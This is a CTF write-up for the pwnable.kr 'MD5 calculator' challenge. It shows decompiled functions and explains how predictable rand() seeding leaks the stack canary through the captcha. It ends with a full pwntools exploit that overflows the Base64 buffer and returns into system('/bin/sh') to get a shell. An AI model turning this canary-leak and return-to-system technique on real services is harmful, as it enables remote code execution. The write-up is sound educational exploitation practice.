# Pwnable.kr MD5 calculator CTF Writeup

## Problem Description

The code of the program is:

### my_hash

```c
08048ed8  int32_t my_hash()

08048edf      void* gsbase
08048edf      int32_t eax = *(gsbase + 0x14)
08048eed      void var_30
08048eed      void* var_38 = &var_30
08048eed      
08048f1a      for (int32_t i = 0; i s<= 7; i += 1)
08048f10          *((i << 2) + var_38) = rand()
08048f10      
08048f75      int32_t result = *(var_38 + 0x14) + *(var_38 + 4) + *(var_38 + 8) - *(var_38 + 0xc) + *(var_38 + 0x20) + *(var_38 + 0x1c) + *(var_38 + 0x10) - *(var_38 + 0x18)
08048f75      
08048f85      if (eax == *(gsbase + 0x14))
08048f91          return result
08048f91      
08048f87      __stack_chk_fail()
08048f87      noreturn
```

### process_hash

```c
08048f92  int32_t process_hash()

08048f9d      void* gsbase
08048f9d      int32_t eax = *(gsbase + 0x14)
08048fbe      void s
08048fbe      __builtin_memset(&s, c: 0, n: 0x200)
08048fc9      int32_t i
08048fc9      
08048fc9      do
08048fc1          i = getchar()
08048fc9      while (i != 0xa)
08048fde      __builtin_memset(s: 0x804b0e0, c: 0, n: 0x400)
08048ff8      fgets(buf: &_0x804b0e0, n: 0x400, fp: stdin)
08049013      __builtin_memset(&s, c: 0, n: 0x200)
08049044      int32_t eax_3 = calc_md5(&s, Base64Decode(0x804b0e0, &s))
08049061      printf(format: "MD5(data) : %s\n", eax_3)
0804906f      free(mem: eax_3)
08049077      int32_t result = eax ^ *(gsbase + 0x14)
08049077      
0804907e      if (result == 0)
0804908e          return result
0804908e      
08049080      __stack_chk_fail()
08049080      noreturn
```

### main

```c
0804908f  int32_t main(int32_t argc, char** argv, char** envp)

080490b8      setvbuf(fp: stdout, buf: nullptr, mode: 1, size: 0)
080490dd      setvbuf(fp: stdin, buf: nullptr, mode: 1, size: 0)
080490e9      puts(str: "- Welcome to the free MD5 calcul…")
080490fd      srand(x: time(nullptr))
08049102      int32_t eax_1 = my_hash()
0804911b      printf(format: "Are you human? input captcha : %…", eax_1)
08049130      int32_t var_18
08049130      __isoc99_scanf(format: &data_80492df, &var_18)
08049130      
0804913d      if (eax_1 != var_18)
08049146          puts(str: "wrong captcha!")
08049152          exit(status: 0)
08049152          noreturn
08049152      
0804915e      puts(str: "Welcome! you are authenticated.")
0804916a      puts(str: "Encode your data with BASE64 the…")
0804916f      process_hash()
0804917b      puts(str: "Thank you for using our service.")
08049187      system(line: "echo `date` >> log")
08049192      return 0
```

## Analysis

The program first using `srand` function to decleare a seed for the random function. the seed is the current time. This means that if we know the eaxct time the program ran, we can know all the random values in the program. after that the program calls `my_hash` function which genreate hash. It does that by creating an array of length 8 that countain random values (that we can predict). Than it calculate the hash like this: `result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6] + var[8]`. As we can see, there is buffer overflow here, because `var[8]` is outside the array. So the hash countain some 4 byte value on the stack, which we can calculate and find. To find whats that value, we need to look in the disasmbley. In there we can see that the canary is set in these lines:
```asm
.text:08048EDF                 mov     eax, large gs:14h
.text:08048EE5                 mov     [ebp-0xc], eax
```
so the canary is located in `[ebp-0xc]`.
In addition we can see from your disassembly:
```asm
mov [ebp-0xc], eax
lea eax, [ebp-0x2c]
mov [ebp-0x34], eax
```
So the array starts at `[ebp-0x2c]` which is `[ebp-44]` and its size is 8 so its total size is 32 bytes, which means the `arr[8]` is in address `[ebp-12]` (44-32=12) which in hex is `[ebp-0xc]`, and thats where the canary is saved.
So the hash is equal to `vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6] + canary`, and since we know all the radom values, we can calculate the canary.


## Exploit Code

```python
from pwn import *
import ctypes
import time

context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = (ctypes.c_uint,)
libc.rand.restype = ctypes.c_int

seed = int(time.time())
libc.srand(seed)

vals = [libc.rand() for _ in range(8)]

result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6]
print("result:", result)

p = remote('localhost', 9002)

p.recvuntil(b'captcha : ')
captcha = int(p.recv().decode())
p.sendline(str(captcha))
print("captcha:", captcha)

canary = captcha - result
canary = canary & 0xffffffff
canary = p32(canary)
print("canary:", canary)

call_system_addr = p32(0x8049187)
print("call system address:", call_system_addr)

binsh_addr = p32(0x804B3AC)
print("/bin/sh address:", binsh_addr)

payload = b'A' * 512 + canary + b'A' * 12 + call_system_addr + binsh_addr
payload = b64e(payload).encode() + b'/bin/sh\0'

p.recvuntil(b'Encode your data with BASE64 then paste me!\n')
p.sendline(payload)
p.interactive()
```


